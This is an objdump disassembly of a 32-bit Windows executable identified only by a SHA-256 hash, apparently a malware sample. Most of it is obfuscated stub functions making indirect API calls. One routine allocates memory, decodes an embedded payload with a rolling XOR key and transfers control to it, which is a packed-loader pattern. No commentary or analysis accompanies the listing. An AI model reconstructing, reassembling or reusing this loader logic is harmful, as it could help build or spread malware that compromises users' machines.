
0b0bedd0552059f0009d5432010795b6d6d288a680475e935e2d4e09a5895d0d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
	...
  4010a0:	popa   
  4010a1:	ret    
  4010a2:	add    BYTE PTR [eax],al
  4010a4:	mov    edi,edi
  4010a6:	push   ebp
  4010a7:	mov    ebp,esp
  4010a9:	sub    esp,0x38
  4010ac:	push   eax
  4010ad:	mov    eax,ds:0x404044
  4010b2:	call   eax
  4010b4:	pop    eax
  4010b5:	push   eax
  4010b6:	push   edi
  4010b7:	push   DWORD PTR [eax+0x244]
  4010bd:	call   0x4028a0
  4010c2:	add    esp,0x8
  4010c5:	pop    eax
  4010c6:	mov    ebx,0x404008
  4010cb:	mov    ebx,DWORD PTR [ebx]
  4010cd:	push   ebx
  4010ce:	push   DWORD PTR [eax-0x4]
  4010d1:	pop    esi
  4010d2:	call   esi
  4010d4:	sub    esp,0xffffffc8
  4010d7:	mov    ebp,DWORD PTR [esp]
  4010da:	add    esp,0x4
  4010dd:	ret    
  4010de:	add    BYTE PTR [eax],al
  4010e0:	mov    edi,edi
  4010e2:	push   ebp
  4010e3:	mov    ebp,esp
  4010e5:	sub    esp,0x40
  4010e8:	push   eax
  4010e9:	lea    eax,[eax-0x100]
  4010ef:	push   eax
  4010f0:	mov    eax,ds:0x404008
  4010f5:	call   eax
  4010f7:	test   eax,eax
  4010f9:	jne    0x4010e9
  4010fb:	pop    eax
  4010fc:	push   eax
  4010fd:	push   edi
  4010fe:	push   esi
  4010ff:	push   DWORD PTR [eax+0x3c0]
  401105:	push   ecx
  401106:	call   0x402468
  40110b:	add    esp,0x10
  40110e:	pop    eax
  40110f:	push   eax
  401110:	mov    edi,0x0
  401115:	push   edi
  401116:	mov    eax,ds:0x404034
  40111b:	call   eax
  40111d:	pop    eax
  40111e:	sub    esp,0xffffffc0
  401121:	mov    ebp,DWORD PTR [esp]
  401124:	add    esp,0x4
  401127:	ret    
	...
  401218:	mov    edi,edi
  40121a:	push   ebp
  40121b:	mov    ebp,esp
  40121d:	sub    esp,0x3c
  401220:	push   eax
  401221:	push   edx
  401222:	push   edx
  401223:	call   0x40171c
  401228:	add    esp,0x8
  40122b:	pop    eax
  40122c:	push   eax
  40122d:	push   0x0
  40122f:	mov    eax,ds:0x40400c
  401234:	call   eax
  401236:	pop    eax
  401237:	push   eax
  401238:	mov    esi,0x0
  40123d:	push   esi
  40123e:	mov    eax,ds:0x404080
  401243:	call   eax
  401245:	pop    eax
  401246:	sub    esp,0xffffffc4
  401249:	mov    ebp,DWORD PTR [esp]
  40124c:	add    esp,0x4
  40124f:	ret    
	...
  4012a0:	mov    edi,edi
  4012a2:	push   ebp
  4012a3:	mov    ebp,esp
  4012a5:	sub    esp,0x34
  4012a8:	push   eax
  4012a9:	push   DWORD PTR [eax+0x168]
  4012af:	push   DWORD PTR [eax+0x1b4]
  4012b5:	call   0x401e7c
  4012ba:	add    esp,0x8
  4012bd:	pop    eax
  4012be:	push   eax
  4012bf:	push   0x0
  4012c1:	mov    eax,ds:0x404020
  4012c6:	call   eax
  4012c8:	pop    eax
  4012c9:	push   eax
  4012ca:	mov    edi,0x0
  4012cf:	push   edi
  4012d0:	mov    eax,ds:0x404054
  4012d5:	call   eax
  4012d7:	pop    eax
  4012d8:	sub    esp,0xffffffcc
  4012db:	mov    ebp,DWORD PTR [esp]
  4012de:	add    esp,0x4
  4012e1:	ret    
  4012e2:	add    BYTE PTR [eax],al
  4012e4:	mov    edi,edi
  4012e6:	push   ebp
  4012e7:	mov    ebp,esp
  4012e9:	sub    esp,0x1c
  4012ec:	push   eax
  4012ed:	push   0x0
  4012ef:	mov    eax,ds:0x40401c
  4012f4:	call   eax
  4012f6:	pop    eax
  4012f7:	push   eax
  4012f8:	push   DWORD PTR [eax+0x2ec]
  4012fe:	push   edi
  4012ff:	call   0x4018d8
  401304:	add    esp,0x8
  401307:	pop    eax
  401308:	push   eax
  401309:	mov    esi,0x0
  40130e:	push   esi
  40130f:	mov    eax,ds:0x404004
  401314:	call   eax
  401316:	pop    eax
  401317:	sub    esp,0xffffffe4
  40131a:	mov    ebp,DWORD PTR [esp]
  40131d:	add    esp,0x4
  401320:	ret    
	...
  4013c1:	add    BYTE PTR [eax],al
  4013c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4013c9:	sub    esp,0x30
  4013cc:	push   eax
  4013cd:	mov    ebx,0x0
  4013d2:	push   ebx
  4013d3:	mov    eax,ds:0x404034
  4013d8:	call   eax
  4013da:	pop    eax
  4013db:	push   eax
  4013dc:	push   DWORD PTR [eax+0x1a0]
  4013e2:	push   DWORD PTR [eax+0x28c]
  4013e8:	push   DWORD PTR [eax+0x228]
  4013ee:	push   DWORD PTR [eax+0x12c]
  4013f4:	call   0x402620
  4013f9:	add    esp,0x10
  4013fc:	pop    eax
  4013fd:	push   eax
  4013fe:	mov    eax,ds:0x404030
  401403:	call   eax
  401405:	pop    eax
  401406:	sub    esp,0xffffffd0
  401409:	mov    ebp,DWORD PTR [esp]
  40140c:	add    esp,0x4
  40140f:	ret    
  401410:	mov    edi,edi
  401412:	push   ebp
  401413:	mov    ebp,esp
  401415:	sub    esp,0x44
  401418:	push   eax
  401419:	push   DWORD PTR [eax+0x98]
  40141f:	push   ebx
  401420:	push   ecx
  401421:	push   ebx
  401422:	call   0x401f94
  401427:	add    esp,0x10
  40142a:	pop    eax
  40142b:	push   eax
  40142c:	push   0x0
  40142e:	mov    eax,ds:0x40402c
  401433:	call   eax
  401435:	pop    eax
  401436:	push   eax
  401437:	mov    eax,ds:0x404044
  40143c:	call   eax
  40143e:	pop    eax
  40143f:	sub    esp,0xffffffbc
  401442:	mov    ebp,DWORD PTR [esp]
  401445:	add    esp,0x4
  401448:	ret    
	...
  4014e9:	add    BYTE PTR [eax],al
  4014eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4014f1:	sub    esp,0x48
  4014f4:	push   eax
  4014f5:	mov    eax,ds:0x404030
  4014fa:	call   eax
  4014fc:	pop    eax
  4014fd:	push   eax
  4014fe:	push   ecx
  4014ff:	push   edi
  401500:	call   0x401e00
  401505:	add    esp,0x8
  401508:	pop    eax
  401509:	push   eax
  40150a:	mov    ebx,0x0
  40150f:	push   ebx
  401510:	mov    eax,ds:0x40401c
  401515:	call   eax
  401517:	pop    eax
  401518:	sub    esp,0xffffffb8
  40151b:	mov    ebp,DWORD PTR [esp]
  40151e:	add    esp,0x4
  401521:	ret    
  401522:	add    BYTE PTR [eax],al
  401524:	mov    edi,edi
  401526:	push   ebp
  401527:	mov    ebp,esp
  401529:	sub    esp,0x2c
  40152c:	push   eax
  40152d:	mov    esi,0x0
  401532:	push   esi
  401533:	mov    eax,ds:0x404014
  401538:	call   eax
  40153a:	pop    eax
  40153b:	push   eax
  40153c:	push   DWORD PTR [eax+0x3ac]
  401542:	push   DWORD PTR [eax+0x2f8]
  401548:	call   0x401c00
  40154d:	add    esp,0x8
  401550:	pop    eax
  401551:	push   eax
  401552:	mov    eax,ds:0x404028
  401557:	call   eax
  401559:	pop    eax
  40155a:	sub    esp,0xffffffd4
  40155d:	mov    ebp,DWORD PTR [esp]
  401560:	add    esp,0x4
  401563:	ret    
  401564:	mov    edi,edi
  401566:	push   ebp
  401567:	mov    ebp,esp
  401569:	sub    esp,0x24
  40156c:	push   eax
  40156d:	push   ebx
  40156e:	push   DWORD PTR [eax+0x300]
  401574:	push   edi
  401575:	push   ebx
  401576:	call   0x402010
  40157b:	add    esp,0x10
  40157e:	pop    eax
  40157f:	push   eax
  401580:	push   0x0
  401582:	mov    eax,ds:0x404020
  401587:	call   eax
  401589:	pop    eax
  40158a:	push   eax
  40158b:	mov    eax,ds:0x404044
  401590:	call   eax
  401592:	pop    eax
  401593:	sub    esp,0xffffffdc
  401596:	mov    ebp,DWORD PTR [esp]
  401599:	add    esp,0x4
  40159c:	ret    
	...
  4015ed:	add    BYTE PTR [eax],al
  4015ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4015f5:	sub    esp,0x38
  4015f8:	push   eax
  4015f9:	push   esi
  4015fa:	push   DWORD PTR [eax+0x58]
  4015fd:	push   esi
  4015fe:	call   0x401e3c
  401603:	add    esp,0xc
  401606:	pop    eax
  401607:	push   eax
  401608:	push   0x0
  40160a:	mov    eax,ds:0x40401c
  40160f:	call   eax
  401611:	pop    eax
  401612:	push   eax
  401613:	mov    eax,0x0
  401618:	push   eax
  401619:	mov    eax,ds:0x404054
  40161e:	call   eax
  401620:	pop    eax
  401621:	sub    esp,0xffffffc8
  401624:	mov    ebp,DWORD PTR [esp]
  401627:	add    esp,0x4
  40162a:	ret    
	...
  40171b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401721:	sub    esp,0x60
  401724:	push   eax
  401725:	mov    eax,ds:0x404028
  40172a:	call   eax
  40172c:	pop    eax
  40172d:	push   eax
  40172e:	push   DWORD PTR [eax+0xb0]
  401734:	push   edx
  401735:	call   0x40254c
  40173a:	add    esp,0x8
  40173d:	pop    eax
  40173e:	push   eax
  40173f:	push   0x0
  401741:	mov    eax,ds:0x404010
  401746:	call   eax
  401748:	pop    eax
  401749:	sub    esp,0xffffffa0
  40174c:	mov    ebp,DWORD PTR [esp]
  40174f:	add    esp,0x4
  401752:	ret    
	...
  4017f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4017f9:	sub    esp,0x54
  4017fc:	push   eax
  4017fd:	mov    eax,ds:0x404044
  401802:	call   eax
  401804:	pop    eax
  401805:	push   eax
  401806:	push   DWORD PTR [eax+0x198]
  40180c:	push   edi
  40180d:	push   DWORD PTR [eax+0x3b0]
  401813:	push   DWORD PTR [eax+0xd8]
  401819:	call   0x402384
  40181e:	add    esp,0x10
  401821:	pop    eax
  401822:	push   eax
  401823:	push   0x0
  401825:	mov    eax,ds:0x404034
  40182a:	call   eax
  40182c:	pop    eax
  40182d:	sub    esp,0xffffffac
  401830:	mov    ebp,DWORD PTR [esp]
  401833:	add    esp,0x4
  401836:	ret    
  401837:	add    BYTE PTR [eax+0x33],ah
  40183a:	rcl    BYTE PTR [edx-0x1],cl
  40183d:	adc    eax,0x404080
  401842:	mov    eax,0x404094
  401847:	sub    eax,0x1
  40184a:	push   0x0
  40184c:	call   DWORD PTR [eax+0x1]
  40184f:	xor    edx,edx
  401851:	add    edx,0x45e200
  401857:	dec    dh
  401859:	push   edx
  40185a:	lea    eax,[edx+0x10]
  40185d:	add    BYTE PTR [eax],0x4
  401860:	push   edx
  401861:	call   DWORD PTR ds:0x404038
  401867:	mov    ecx,eax
  401869:	mov    cl,0x3c
  40186b:	mov    ecx,DWORD PTR [ecx]
  40186d:	mov    ecx,DWORD PTR [eax+ecx*1+0x1c]
  401871:	ror    ecx,0xc
  401874:	mov    eax,ecx
  401876:	sub    al,0x10
  401878:	pop    eax
  401879:	jb     0x4010a0
  40187f:	ja     0x4010a4
  401885:	ret    
	...
  4018d6:	add    BYTE PTR [eax],al
  4018d8:	mov    edi,edi
  4018da:	push   ebp
  4018db:	mov    ebp,esp
  4018dd:	sub    esp,0x44
  4018e0:	push   eax
  4018e1:	push   edx
  4018e2:	push   edx
  4018e3:	push   esi
  4018e4:	push   edi
  4018e5:	call   0x401564
  4018ea:	add    esp,0x10
  4018ed:	pop    eax
  4018ee:	push   eax
  4018ef:	push   0x0
  4018f1:	mov    eax,ds:0x404004
  4018f6:	call   eax
  4018f8:	pop    eax
  4018f9:	push   eax
  4018fa:	push   0x0
  4018fc:	mov    eax,ds:0x404034
  401901:	call   eax
  401903:	pop    eax
  401904:	sub    esp,0xffffffbc
  401907:	mov    ebp,DWORD PTR [esp]
  40190a:	add    esp,0x4
  40190d:	ret    
  40190e:	add    BYTE PTR [eax],al
  401910:	mov    edi,edi
  401912:	push   ebp
  401913:	mov    ebp,esp
  401915:	sub    esp,0x40
  401918:	push   eax
  401919:	push   0x6b4
  40191e:	mov    ebx,0x6b4
  401923:	push   ebx
  401924:	mov    eax,0x40001
  401929:	push   eax
  40192a:	push   0x0
  40192c:	xor    DWORD PTR [esp],0x89e6ba69
  401933:	pop    eax
  401934:	sub    eax,0x89a67a45
  401939:	push   DWORD PTR [eax]
  40193b:	sub    DWORD PTR [esp],0x2
  40193f:	mov    eax,0x404038
  401944:	pop    DWORD PTR [eax]
  401946:	mov    eax,ds:0x404038
  40194b:	call   eax
  40194d:	xchg   DWORD PTR [esp],eax
  401950:	pop    DWORD PTR [eax-0x4]
  401953:	mov    ebx,DWORD PTR [eax-0x4]
  401956:	mov    edi,ebx
  401958:	sub    ecx,ecx
  40195a:	dec    ecx
  40195b:	and    ecx,0x4029a2
  401961:	mov    edx,0x7a89d45a
  401966:	push   0x6b4
  40196b:	pop    esi
  40196c:	cmp    esi,0x0
  40196f:	je     0x401993
  401971:	add    esi,0xfffffffc
  401974:	mov    ebx,edx
  401976:	xor    ebx,DWORD PTR [ecx]
  401978:	push   ebx
  401979:	sub    ebx,ebx
  40197b:	sub    DWORD PTR [esp],0x1
  40197f:	pop    DWORD PTR [edi+ebx*2]
  401982:	push   0x1
  401984:	sub    DWORD PTR [esp],edx
  401987:	mov    edx,0xfffffffc
  40198c:	sub    ecx,edx
  40198e:	sub    edi,edx
  401990:	pop    edx
  401991:	jmp    0x40196c
  401993:	push   eax
  401994:	mov    eax,0x0
  401999:	push   eax
  40199a:	mov    eax,ds:0x404054
  40199f:	call   eax
  4019a1:	pop    eax
  4019a2:	sub    esp,0xffffffc0
  4019a5:	pop    ebp
  4019a6:	ret    
  4019a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4019ad:	sub    esp,0x30
  4019b0:	push   eax
  4019b1:	push   ebx
  4019b2:	push   edi
  4019b3:	call   0x402740
  4019b8:	add    esp,0x8
  4019bb:	pop    eax
  4019bc:	push   eax
  4019bd:	push   0x0
  4019bf:	mov    eax,ds:0x404074
  4019c4:	call   eax
  4019c6:	pop    eax
  4019c7:	push   eax
  4019c8:	push   0x0
  4019ca:	mov    eax,ds:0x404054
  4019cf:	call   eax
  4019d1:	pop    eax
  4019d2:	sub    esp,0xffffffd0
  4019d5:	mov    ebp,DWORD PTR [esp]
  4019d8:	add    esp,0x4
  4019db:	ret    
  4019dc:	mov    edi,edi
  4019de:	push   ebp
  4019df:	mov    ebp,esp
  4019e1:	sub    esp,0x50
  4019e4:	push   eax
  4019e5:	push   ecx
  4019e6:	push   edi
  4019e7:	push   ecx
  4019e8:	call   0x4019a8
  4019ed:	add    esp,0xc
  4019f0:	pop    eax
  4019f1:	push   eax
  4019f2:	mov    eax,ds:0x404028
  4019f7:	call   eax
  4019f9:	pop    eax
  4019fa:	push   eax
  4019fb:	push   0x0
  4019fd:	mov    eax,ds:0x40402c
  401a02:	call   eax
  401a04:	pop    eax
  401a05:	sub    esp,0xffffffb0
  401a08:	mov    ebp,DWORD PTR [esp]
  401a0b:	add    esp,0x4
  401a0e:	ret    
  401a0f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401a15:	sub    esp,0x44
  401a18:	push   eax
  401a19:	mov    eax,ds:0x404030
  401a1e:	call   eax
  401a20:	pop    eax
  401a21:	push   eax
  401a22:	push   ebx
  401a23:	push   edi
  401a24:	call   0x40278c
  401a29:	add    esp,0x8
  401a2c:	pop    eax
  401a2d:	push   eax
  401a2e:	mov    esi,0x0
  401a33:	push   esi
  401a34:	mov    eax,ds:0x404014
  401a39:	call   eax
  401a3b:	pop    eax
  401a3c:	sub    esp,0xffffffbc
  401a3f:	mov    ebp,DWORD PTR [esp]
  401a42:	add    esp,0x4
  401a45:	ret    
  401a46:	add    BYTE PTR [eax],al
  401a48:	mov    edi,edi
  401a4a:	push   ebp
  401a4b:	mov    ebp,esp
  401a4d:	sub    esp,0x50
  401a50:	push   eax
  401a51:	push   edi
  401a52:	push   DWORD PTR [eax+0x238]
  401a58:	push   ebx
  401a59:	call   0x4012e4
  401a5e:	add    esp,0xc
  401a61:	pop    eax
  401a62:	push   eax
  401a63:	mov    edi,0x0
  401a68:	push   edi
  401a69:	mov    eax,ds:0x404054
  401a6e:	call   eax
  401a70:	pop    eax
  401a71:	push   eax
  401a72:	mov    esi,0x0
  401a77:	push   esi
  401a78:	mov    eax,ds:0x404010
  401a7d:	call   eax
  401a7f:	pop    eax
  401a80:	sub    esp,0xffffffb0
  401a83:	mov    ebp,DWORD PTR [esp]
  401a86:	add    esp,0x4
  401a89:	ret    
  401a8a:	add    BYTE PTR [eax],al
  401a8c:	mov    edi,edi
  401a8e:	push   ebp
  401a8f:	mov    ebp,esp
  401a91:	sub    esp,0x60
  401a94:	push   eax
  401a95:	push   DWORD PTR [eax+0x2c8]
  401a9b:	push   DWORD PTR [eax+0x64]
  401a9e:	push   ebx
  401a9f:	push   DWORD PTR [eax+0x290]
  401aa5:	call   0x4012a0
  401aaa:	add    esp,0x10
  401aad:	pop    eax
  401aae:	push   eax
  401aaf:	push   0x0
  401ab1:	mov    eax,ds:0x404004
  401ab6:	call   eax
  401ab8:	pop    eax
  401ab9:	push   eax
  401aba:	push   0x0
  401abc:	mov    eax,ds:0x404014
  401ac1:	call   eax
  401ac3:	pop    eax
  401ac4:	sub    esp,0xffffffa0
  401ac7:	mov    ebp,DWORD PTR [esp]
  401aca:	add    esp,0x4
  401acd:	ret    
	...
  401bbe:	add    BYTE PTR [eax],al
  401bc0:	mov    edi,edi
  401bc2:	push   ebp
  401bc3:	mov    ebp,esp
  401bc5:	sub    esp,0x60
  401bc8:	push   eax
  401bc9:	push   0x0
  401bcb:	mov    eax,ds:0x404034
  401bd0:	call   eax
  401bd2:	pop    eax
  401bd3:	push   eax
  401bd4:	push   ebx
  401bd5:	push   ecx
  401bd6:	call   0x4026b4
  401bdb:	add    esp,0x8
  401bde:	pop    eax
  401bdf:	push   eax
  401be0:	lea    edi,[eax-0x100]
  401be6:	push   edi
  401be7:	mov    eax,ds:0x404008
  401bec:	call   eax
  401bee:	test   eax,eax
  401bf0:	jne    0x401be0
  401bf2:	pop    eax
  401bf3:	sub    esp,0xffffffa0
  401bf6:	mov    ebp,DWORD PTR [esp]
  401bf9:	add    esp,0x4
  401bfc:	ret    
  401bfd:	add    BYTE PTR [eax],al
  401bff:	add    BYTE PTR [ebx-0x1374aa01],cl
  401c05:	sub    esp,0x54
  401c08:	push   eax
  401c09:	push   0x0
  401c0b:	mov    eax,ds:0x404054
  401c10:	call   eax
  401c12:	pop    eax
  401c13:	push   eax
  401c14:	push   esi
  401c15:	push   DWORD PTR [eax]
  401c17:	push   DWORD PTR [eax+0xdc]
  401c1d:	call   0x402864
  401c22:	add    esp,0xc
  401c25:	pop    eax
  401c26:	push   eax
  401c27:	mov    eax,0x0
  401c2c:	push   eax
  401c2d:	mov    eax,ds:0x404010
  401c32:	call   eax
  401c34:	pop    eax
  401c35:	sub    esp,0xffffffac
  401c38:	mov    ebp,DWORD PTR [esp]
  401c3b:	add    esp,0x4
  401c3e:	ret    
  401c3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401c45:	sub    esp,0x28
  401c48:	push   eax
  401c49:	mov    edx,0x0
  401c4e:	push   edx
  401c4f:	mov    eax,ds:0x404074
  401c54:	call   eax
  401c56:	pop    eax
  401c57:	push   eax
  401c58:	push   DWORD PTR [eax+0x2b0]
  401c5e:	push   ebx
  401c5f:	call   0x4010e0
  401c64:	add    esp,0x8
  401c67:	pop    eax
  401c68:	push   eax
  401c69:	mov    edi,0x0
  401c6e:	push   edi
  401c6f:	mov    eax,ds:0x404074
  401c74:	call   eax
  401c76:	pop    eax
  401c77:	sub    esp,0xffffffd8
  401c7a:	mov    ebp,DWORD PTR [esp]
  401c7d:	add    esp,0x4
  401c80:	ret    
  401c81:	add    BYTE PTR [eax],al
  401c83:	add    BYTE PTR [ebx-0x1374aa01],cl
  401c89:	sub    esp,0x34
  401c8c:	push   eax
  401c8d:	push   0x0
  401c8f:	mov    eax,ds:0x404074
  401c94:	call   eax
  401c96:	pop    eax
  401c97:	push   eax
  401c98:	push   ebx
  401c99:	push   ecx
  401c9a:	push   edi
  401c9b:	push   DWORD PTR [eax+0x148]
  401ca1:	call   0x4014ec
  401ca6:	add    esp,0x10
  401ca9:	pop    eax
  401caa:	push   eax
  401cab:	mov    esi,0x0
  401cb0:	push   esi
  401cb1:	mov    eax,ds:0x40401c
  401cb6:	call   eax
  401cb8:	pop    eax
  401cb9:	sub    esp,0xffffffcc
  401cbc:	mov    ebp,DWORD PTR [esp]
  401cbf:	add    esp,0x4
  401cc2:	ret    
	...
  401db3:	add    BYTE PTR [ebx-0x1374aa01],cl
  401db9:	sub    esp,0x20
  401dbc:	push   eax
  401dbd:	push   DWORD PTR [eax+0x2f0]
  401dc3:	push   DWORD PTR [eax+0x1a4]
  401dc9:	push   DWORD PTR [eax+0x3b8]
  401dcf:	call   0x402598
  401dd4:	add    esp,0xc
  401dd7:	pop    eax
  401dd8:	push   eax
  401dd9:	lea    ebx,[eax-0x100]
  401ddf:	push   ebx
  401de0:	mov    eax,ds:0x404008
  401de5:	call   eax
  401de7:	test   eax,eax
  401de9:	jne    0x401dd9
  401deb:	pop    eax
  401dec:	push   eax
  401ded:	mov    eax,ds:0x404028
  401df2:	call   eax
  401df4:	pop    eax
  401df5:	sub    esp,0xffffffe0
  401df8:	mov    ebp,DWORD PTR [esp]
  401dfb:	add    esp,0x4
  401dfe:	ret    
  401dff:	add    BYTE PTR [ebx-0x1374aa01],cl
  401e05:	sub    esp,0x54
  401e08:	push   eax
  401e09:	mov    esi,0x0
  401e0e:	push   esi
  401e0f:	mov    eax,ds:0x40402c
  401e14:	call   eax
  401e16:	pop    eax
  401e17:	push   eax
  401e18:	push   ebx
  401e19:	push   edi
  401e1a:	call   0x401c40
  401e1f:	add    esp,0x8
  401e22:	pop    eax
  401e23:	push   eax
  401e24:	mov    esi,0x0
  401e29:	push   esi
  401e2a:	mov    eax,ds:0x404020
  401e2f:	call   eax
  401e31:	pop    eax
  401e32:	sub    esp,0xffffffac
  401e35:	mov    ebp,DWORD PTR [esp]
  401e38:	add    esp,0x4
  401e3b:	ret    
  401e3c:	mov    edi,edi
  401e3e:	push   ebp
  401e3f:	mov    ebp,esp
  401e41:	sub    esp,0x5c
  401e44:	push   eax
  401e45:	push   ebx
  401e46:	push   DWORD PTR [eax+0x33c]
  401e4c:	call   0x401db4
  401e51:	add    esp,0x8
  401e54:	pop    eax
  401e55:	push   eax
  401e56:	push   0x0
  401e58:	mov    eax,ds:0x404074
  401e5d:	call   eax
  401e5f:	pop    eax
  401e60:	push   eax
  401e61:	mov    esi,0x0
  401e66:	push   esi
  401e67:	mov    eax,ds:0x404014
  401e6c:	call   eax
  401e6e:	pop    eax
  401e6f:	sub    esp,0xffffffa4
  401e72:	mov    ebp,DWORD PTR [esp]
  401e75:	add    esp,0x4
  401e78:	ret    
  401e79:	add    BYTE PTR [eax],al
  401e7b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401e81:	sub    esp,0x34
  401e84:	push   eax
  401e85:	push   edx
  401e86:	push   esi
  401e87:	push   DWORD PTR [eax+0x328]
  401e8d:	call   0x401524
  401e92:	add    esp,0xc
  401e95:	pop    eax
  401e96:	push   eax
  401e97:	push   0x0
  401e99:	mov    eax,ds:0x404014
  401e9e:	call   eax
  401ea0:	pop    eax
  401ea1:	push   eax
  401ea2:	mov    eax,ds:0x404028
  401ea7:	call   eax
  401ea9:	pop    eax
  401eaa:	sub    esp,0xffffffcc
  401ead:	mov    ebp,DWORD PTR [esp]
  401eb0:	add    esp,0x4
  401eb3:	ret    
  401eb4:	mov    edi,edi
  401eb6:	push   ebp
  401eb7:	mov    ebp,esp
  401eb9:	sub    esp,0x54
  401ebc:	push   eax
  401ebd:	mov    edi,0x0
  401ec2:	push   edi
  401ec3:	mov    eax,ds:0x404080
  401ec8:	call   eax
  401eca:	pop    eax
  401ecb:	push   eax
  401ecc:	push   DWORD PTR [eax+0x98]
  401ed2:	push   ebx
  401ed3:	push   esi
  401ed4:	push   ebx
  401ed5:	call   0x402824
  401eda:	add    esp,0x10
  401edd:	pop    eax
  401ede:	push   eax
  401edf:	mov    eax,0x0
  401ee4:	push   eax
  401ee5:	mov    eax,ds:0x404034
  401eea:	call   eax
  401eec:	pop    eax
  401eed:	sub    esp,0xffffffac
  401ef0:	mov    ebp,DWORD PTR [esp]
  401ef3:	add    esp,0x4
  401ef6:	ret    
	...
  401f47:	add    BYTE PTR [ebx-0x1374aa01],cl
  401f4d:	sub    esp,0x2c
  401f50:	push   eax
  401f51:	push   DWORD PTR [eax+0x328]
  401f57:	push   DWORD PTR [eax+0x26c]
  401f5d:	push   DWORD PTR [eax+0x210]
  401f63:	push   edi
  401f64:	call   0x401910
  401f69:	add    esp,0x10
  401f6c:	pop    eax
  401f6d:	push   eax
  401f6e:	push   0x0
  401f70:	mov    eax,ds:0x404020
  401f75:	call   eax
  401f77:	pop    eax
  401f78:	push   eax
  401f79:	mov    esi,0x0
  401f7e:	push   esi
  401f7f:	mov    eax,ds:0x404080
  401f84:	call   eax
  401f86:	pop    eax
  401f87:	sub    esp,0xffffffd4
  401f8a:	mov    ebp,DWORD PTR [esp]
  401f8d:	add    esp,0x4
  401f90:	ret    
  401f91:	add    BYTE PTR [eax],al
  401f93:	add    BYTE PTR [ebx-0x1374aa01],cl
  401f99:	sub    esp,0x5c
  401f9c:	push   eax
  401f9d:	mov    esi,0x0
  401fa2:	push   esi
  401fa3:	mov    eax,ds:0x404054
  401fa8:	call   eax
  401faa:	pop    eax
  401fab:	push   eax
  401fac:	push   DWORD PTR [eax+0x30]
  401faf:	push   ebx
  401fb0:	push   DWORD PTR [eax+0x3f0]
  401fb6:	push   ecx
  401fb7:	call   0x4020a4
  401fbc:	add    esp,0x10
  401fbf:	pop    eax
  401fc0:	push   eax
  401fc1:	mov    edx,0x0
  401fc6:	push   edx
  401fc7:	mov    eax,ds:0x40400c
  401fcc:	call   eax
  401fce:	pop    eax
  401fcf:	sub    esp,0xffffffa4
  401fd2:	mov    ebp,DWORD PTR [esp]
  401fd5:	add    esp,0x4
  401fd8:	ret    
  401fd9:	add    BYTE PTR [eax],al
  401fdb:	add    BYTE PTR [ebx-0x1374aa01],cl
  401fe1:	sub    esp,0x3c
  401fe4:	push   eax
  401fe5:	push   edx
  401fe6:	push   ecx
  401fe7:	call   0x4017f4
  401fec:	add    esp,0x8
  401fef:	pop    eax
  401ff0:	push   eax
  401ff1:	push   0x0
  401ff3:	mov    eax,ds:0x404054
  401ff8:	call   eax
  401ffa:	pop    eax
  401ffb:	push   eax
  401ffc:	push   0x0
  401ffe:	mov    eax,ds:0x40402c
  402003:	call   eax
  402005:	pop    eax
  402006:	sub    esp,0xffffffc4
  402009:	mov    ebp,DWORD PTR [esp]
  40200c:	add    esp,0x4
  40200f:	ret    
  402010:	mov    edi,edi
  402012:	push   ebp
  402013:	mov    ebp,esp
  402015:	sub    esp,0x2c
  402018:	push   eax
  402019:	mov    edi,0x0
  40201e:	push   edi
  40201f:	mov    eax,ds:0x404080
  402024:	call   eax
  402026:	pop    eax
  402027:	push   eax
  402028:	push   esi
  402029:	push   edi
  40202a:	call   0x40234c
  40202f:	add    esp,0x8
  402032:	pop    eax
  402033:	push   eax
  402034:	lea    ebx,[eax-0x100]
  40203a:	push   ebx
  40203b:	mov    eax,ds:0x404008
  402040:	call   eax
  402042:	test   eax,eax
  402044:	jne    0x402034
  402046:	pop    eax
  402047:	sub    esp,0xffffffd4
  40204a:	mov    ebp,DWORD PTR [esp]
  40204d:	add    esp,0x4
  402050:	ret    
	...
  4020a1:	add    BYTE PTR [eax],al
  4020a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4020a9:	sub    esp,0x5c
  4020ac:	push   eax
  4020ad:	push   0x0
  4020af:	mov    eax,ds:0x40401c
  4020b4:	call   eax
  4020b6:	pop    eax
  4020b7:	push   eax
  4020b8:	push   DWORD PTR [eax+0x3ec]
  4020be:	push   DWORD PTR [eax+0x1c]
  4020c1:	push   edx
  4020c2:	call   0x401eb4
  4020c7:	add    esp,0xc
  4020ca:	pop    eax
  4020cb:	push   eax
  4020cc:	mov    ebx,0x0
  4020d1:	push   ebx
  4020d2:	mov    eax,ds:0x404074
  4020d7:	call   eax
  4020d9:	pop    eax
  4020da:	sub    esp,0xffffffa4
  4020dd:	mov    ebp,DWORD PTR [esp]
  4020e0:	add    esp,0x4
  4020e3:	ret    
  4020e4:	mov    edi,edi
  4020e6:	push   ebp
  4020e7:	mov    ebp,esp
  4020e9:	sub    esp,0x20
  4020ec:	push   eax
  4020ed:	push   edi
  4020ee:	push   ebx
  4020ef:	push   DWORD PTR [eax+0x350]
  4020f5:	call   0x401a8c
  4020fa:	add    esp,0xc
  4020fd:	pop    eax
  4020fe:	push   eax
  4020ff:	push   0x0
  402101:	mov    eax,ds:0x40402c
  402106:	call   eax
  402108:	pop    eax
  402109:	push   eax
  40210a:	mov    eax,ds:0x404030
  40210f:	call   eax
  402111:	pop    eax
  402112:	sub    esp,0xffffffe0
  402115:	mov    ebp,DWORD PTR [esp]
  402118:	add    esp,0x4
  40211b:	ret    
	...
  40234c:	mov    edi,edi
  40234e:	push   ebp
  40234f:	mov    ebp,esp
  402351:	sub    esp,0x54
  402354:	push   eax
  402355:	push   edx
  402356:	push   ebx
  402357:	call   0x401a10
  40235c:	add    esp,0x8
  40235f:	pop    eax
  402360:	push   eax
  402361:	mov    ecx,0x0
  402366:	push   ecx
  402367:	mov    eax,ds:0x404004
  40236c:	call   eax
  40236e:	pop    eax
  40236f:	push   eax
  402370:	push   0x0
  402372:	mov    eax,ds:0x404010
  402377:	call   eax
  402379:	pop    eax
  40237a:	sub    esp,0xffffffac
  40237d:	mov    ebp,DWORD PTR [esp]
